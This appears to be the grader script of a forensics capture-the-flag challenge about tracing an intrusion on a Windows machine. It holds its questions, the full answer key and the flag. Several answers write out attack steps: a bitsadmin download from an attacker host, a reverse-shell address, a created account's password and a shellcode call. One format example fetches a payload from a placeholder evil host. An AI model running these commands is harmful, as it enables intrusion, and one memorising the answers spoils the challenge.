def main():
    print("=" * 80)
    print("MEPHISTOPHELES")
    print("=" * 80)
    print("\n⚠️ This is a multi-episode investigation challenge!")
    print("Complete all episodes to uncover the full attack chain.\n")
    
    questions = [
        {
            "episode": "Episode I: The Responder First Day",
            "question": "The day of the compromise arrived from an installer downloads. Where is it downloaded from (Full URL)? What's the name of the file and when was the file downloaded successfully to the disk? (Answer with underscores concatenated respectively)",
            "format": "http://jajar.baboi/M4Luwer.exe_M4Luwer.exe_10/28/2024 04:10:23 AM"
        },
        {
            "episode": "Episode I: The Responder First Day",
            "question": "When does the installer gets executed for the first time?",
            "format": "06/20/2021 10:23:14 AM"
        },
        {
            "episode": "Episode I: The Responder First Day",
            "question": "There are two files dropped after the user executed the installer (exclude the shortcut). What are the names of the files (include their extensions with comma delimiters)?",
            "format": "dorodoro.exe,mangekyo.exe"
        },
        {
            "episode": "Episode I: The Responder First Day",
            "question": "Where did these files are dropped in the victim machine?",
            "format": "D:\\Blataran\\DirectoryName"
        },
        {
            "episode": "Episode I: The Responder First Day",
            "question": "There's a shortcut link file created as well. Where is this located in the victim's machine?",
            "format": "D:\\Blataran\\Jeje.lnk"
        },
        {
            "episode": "Episode I: The Responder First Day",
            "question": "It looks like there's a callback / backconnect / backdoor implemented but this is just a hypothesis for now. What's the attacker IP & port used?",
            "format": "10.12.41.23:9999"
        },
        
        # ========== Episode II: The Adversary Breadcrumbs ==========
        {
            "episode": "Episode II: The Adversary Breadcrumbs",
            "question": "Upon compromising the machine, the attacker uploads certain files from its host to the victim's machine. What's the full local URL that host these files?",
            "format": "http://172.16.1.10:5656"
        },
        {
            "episode": "Episode II: The Adversary Breadcrumbs",
            "question": "Where do most of the uploaded files resided in the victim's machine? Please do provide the full path!",
            "format": "D:\\Blataran"
        },
        {
            "episode": "Episode II: The Adversary Breadcrumbs",
            "question": "The FIRST two files which attacker has uploaded to the victim's machine was leveraged by using a Living-Off-the-Land Binaries/Executable(s). One of the uploaded file was a secure deletion compressed file. Please do provide this full VALID command!",
            "format": "D:\\Blataran\\harambe.exe galileo \"jupri\""
        },
        {
            "episode": "Episode II: The Adversary Breadcrumbs",
            "question": "After unzipping these two files, what are the first OS command utility executed by the attacker?",
            "format": "hostname"
        },
        {
            "episode": "Episode II: The Adversary Breadcrumbs",
            "question": "The attacker created an arbitrary user in the victim's machine, although there are several attempts. What are the final fixed user credentials that was used by the attacker? (Use underscores to distinguish the username and its password)",
            "format": "juniper_p4ssw0rd"
        },
        {
            "episode": "Episode II: The Adversary Breadcrumbs",
            "question": "The attacker assigned the arbitrary user to 2 groups. What are those? Use comma delimiters to answer this question!",
            "format": "Enterprise Admin Users,File Operators"
        },
        {
            "episode": "Episode II: The Adversary Breadcrumbs",
            "question": "After these actions done, when was the FIRST TIME that the attacker SUCCESSFULLY logins to the victim's machine using the arbitrary user credentials through RDP? (Answer in format MM/DD/YYYY HH:MM AM/PM)",
            "format": "06/15/2024 03:45 PM"
        },
        {
            "episode": "Episode II: The Adversary Breadcrumbs",
            "question": "What is the modified executable file's name that was used from the attacker to perform a credential dumping? Please do provide the answer in form of full path!",
            "format": "C:\\Tools\\credump.exe"
        },
        {
            "episode": "Episode II: The Adversary Breadcrumbs",
            "question": "Besides the credential dumper executable, there's another uploaded malicious file that has a capability to exploit the Windows Access Token Privilege. What's this file's name on the victim's machine? Please do provide the answer in form of full path!",
            "format": "C:\\Malware\\tokenhijack.exe"
        },
        {
            "episode": "Episode II: The Adversary Breadcrumbs",
            "question": "What is the created named pipe from the prior/similar executable that is used to perform a privilege escalation that led to a successful reverse shell with NT Authority Context? Provide the full pipe name!",
            "format": "\\12345678-abcd-1234-ef00-123456789abc\\pipe\\winreg"
        },
        {
            "episode": "Episode II: The Adversary Breadcrumbs",
            "question": "The prior reverse shell is leveraged from a known executable listener but the name is also modified in the victim's machine. What's the name of the changed file's name? Please do provide the answer in form of full path!",
            "format": "C:\\Tools\\listener.exe"
        },
        
        # ========== Episode III: And I am Giving You the New Devil ==========
        {
            "episode": "Episode III: And I am Giving You the New Devil",
            "question": "Let's recall back to our point zero where the compromises begins. Our focus now is on the installer and the dropped files. By looking back the question to HOW can the attacker compromise the victims' device, you have to reverse engineer them as there might be a hidden shellcode placed inside those. Please do provide the MD5 of the shellcode!",
            "format": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"
        },
        {
            "episode": "Episode III: And I am Giving You the New Devil",
            "question": "It looks like this malware campaign has been around 2019-2022. Are you able to perform complete extraction of the embedded pre-executed script inside the malicious file? NOTE THAT this script is readable, and for the POC, first please do provide us what's the full strings content of func_2 message?",
            "format": "Welcome to the dark side, hacker!"
        },
        {
            "episode": "Episode III: And I am Giving You the New Devil",
            "question": "Still referring from the question before, what's the responsible function name that performs the malicious action?",
            "format": "Rajag4t4B"
        },
        {
            "episode": "Episode III: And I am Giving You the New Devil",
            "question": """
            Again, still referring from the question before, since you've spotted the function that does the malicious shellcode execution, please do provide the last 2 lines of code BEFORE the end of the function delimited by underscore!

            For example, you found this function:

			```
			def evil(x):
			     a = [x,'1','2',...]
			     [SNIP]
			     m = "whoami"
			     system(m)
			```
            """,
            "format": "m = \"whoami\"_system(m)"
        },
        
        # ========== Episode IV: The Last Rites ==========
        {
            "episode": "Episode IV: The Last Rites",
            "question": """
            The attacker somehow managed to delete our internal documents securely. However, we believe that there's a chance to recover it since it only has one page with big font related to the victim's company vault code. Can you provide us the full strings content of it?

            Here's the screenshotted overview of how we save it: https://drive.google.com/file/d/1cG5znJHGIB3exL09uNKfGzNptQX3Svxt/view?usp=sharing

            """,
            "format": "Ini Hanya Untuk Internal 99887766"
        },
        {
            "episode": "Episode IV: The Last Rites",
            "question": "It looks like the attacker creates a malicious persistence besides creating arbitrary user, making them to login as the Administrator as well. What's the name of the executable that responsible to do so?",
            "format": "persistence.exe"
        },
        {
            "episode": "Episode IV: The Last Rites",
            "question": "What's the scheduled task that is being targeted by this executable? Please do provide its URI.",
            "format": "\\Firefox\\Maintainer"
        },
        {
            "episode": "Episode IV: The Last Rites",
            "question": "What's the full command of the overwritten scheduled task?",
            "format": "D:\\blataran\\jamoer.exe --SilentInstall http://jagad.evil/badarawuhi.exe; sc query badarawuhi.exe"
        }
    ]

    answers = [
        # Episode I answers
        "https://cybersharing.net/api/download/file/8bd5ce87-b1d2-45a8-be68-03bc664ab068/7f203a93-4619-40f8-93c4-e075eb4d39dd/ea62a809-a93b-4a89-bfe1-33247f5058f8/AnsiArtInstaller.exe_AnsiArtInstaller.exe_12/21/2025 11:14:31 PM",
        "12/21/2025 11:15:10 PM",
        ["program.banner,ansi_art.exe", "ansi_art.exe,program.banner"],
        ["C:\\Users\\Administrator\\AppData\\Local\\Temp", "C:\\Users\\Administrator\\AppData\\Local\\Temp\\", "%TEMP%", "TEMP", "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\", "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp"],
        "C:\\Users\\Administrator\\Desktop\\AnsiArt.lnk",
        "192.168.100.157:443",
        
        # Episode II answers
        "http://192.168.100.157:8082",
        ["C:\\h1dd3n", "C:\\h1dd3n\\"],
        ["\"C:\\Windows\\system32\\bitsadmin.exe\" /Transfer jarangoyang /priority foreground http://192.168.100.157:8082/SDelete.zip C:\\h1dd3n\\sadewa.zip", "C:\\Windows\\system32\\bitsadmin.exe /Transfer jarangoyang /priority foreground http://192.168.100.157:8082/SDelete.zip C:\\h1dd3n\\sadewa.zip", "bitsadmin.exe /Transfer jarangoyang /priority foreground http://192.168.100.157:8082/SDelete.zip C:\\h1dd3n\\sadewa.zip", "bitsadmin /Transfer jarangoyang /priority foreground http://192.168.100.157:8082/SDelete.zip C:\\h1dd3n\\sadewa.zip"],
        ["ipconfig", "ipconfig.exe", "C:\\Windows\\system32\\ipconfig.exe"],
        "as3ng_AsengCupu123!",
        ["administrators,Remote Desktop Users", "Remote Desktop Users,administrators"],
        ["12/22/2025 12:02 AM", "12/22/2025 12:03 AM"],
        "C:\\h1dd3n\\mimiperi.exe",
        ["C:\\h1dd3n\\sassy.exe","C:\\h1dd3n\\pelor.exe"],
        ["\\85985985-ddfa-430b-bf04-fc33fcfdc881\\pipe\\epmapper", "\\\\.\\pipe\\85985985-ddfa-430b-bf04-fc33fcfdc881\\pipe\\epmapper"],
        "C:\\h1dd3n\\kucing.exe",
        
        # Episode III answers
        "1bc45ea74b3582d815e9cdfb46bed530",
        "Enjoy your game, sincerely from APT!",
        ".onInit",
        "IntOp $9 $7 + 1337_System::Call ::$9",
        
        # Episode IV answers
        "Kode Rahasia Brankas PT Dananrata 11111131",
        "gnarly.exe",
        "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan",
        "cmd.exe /c C:\\Users\\Administrator\\Downloads\\AnsiArtInstaller.exe"
    ]

    current_episode = ""
    correct_answers = 0
    episode_progress = {
        "Episode I: The Responder First Day": 0,
        "Episode II: The Adversary Breadcrumbs": 0,
        "Episode III: And I am Giving You the New Devil": 0,
        "Episode IV: The Last Rites": 0
    }

    for index, q in enumerate(questions, start=1):
        if q["episode"] != current_episode:
            current_episode = q["episode"]
            print("\n" + "=" * 80)
            if "Episode I" in current_episode:
                print(f"📂 {current_episode} 📂")
            elif "Episode II" in current_episode:
                print(f"🕵️ {current_episode} 🕵️")
            elif "Episode III" in current_episode:
                print(f"👹 {current_episode} 👹")
            elif "Episode IV" in current_episode:
                print(f"💀 {current_episode} 💀")
            print("=" * 80)
        
        print(f"\n{'─' * 80}")
        print(f"❓ Question {index}/{len(questions)}:")
        print(f"{'─' * 80}")
        print(q["question"])
        print(f"\n💡 Format: {q['format']}")
        print("─" * 80)
        user_answer = input("Answer: ").strip()
        
        expected_answer = answers[index - 1]
        user_answer_lower = user_answer.lower()
        
        if isinstance(expected_answer, list):
            is_correct = any(user_answer_lower == str(ans).lower() for ans in expected_answer)
        else:
            is_correct = user_answer_lower == str(expected_answer).lower()
        
        if is_correct:
            correct_answers += 1
            episode_progress[q["episode"]] += 1
            print("Correct!")
        else:
            print("Incorrect!")
            return
    
    if correct_answers == len(questions):
        print("\n" + "=" * 80)
        print("🎊 INVESTIGATION COMPLETE! ALL EPISODES SOLVED! 🎊")
        print("=" * 80)
        print("\n🏆 Congratulations! You've successfully traced the entire attack chain!")
        print("\n🚩 Flag: CJ2025{APT_a.k.a_as3ng_p3rs1st3nt_thr34t_h!t5_4g4in_4nD_y0u_succ3ssfuLLy_s0lved_4ll_0f_th3m_w!th_gr4c3_&_gl0ry_ce4b5a04dc}")
        print("\n" + "=" * 80)

if __name__ == "__main__":
    main()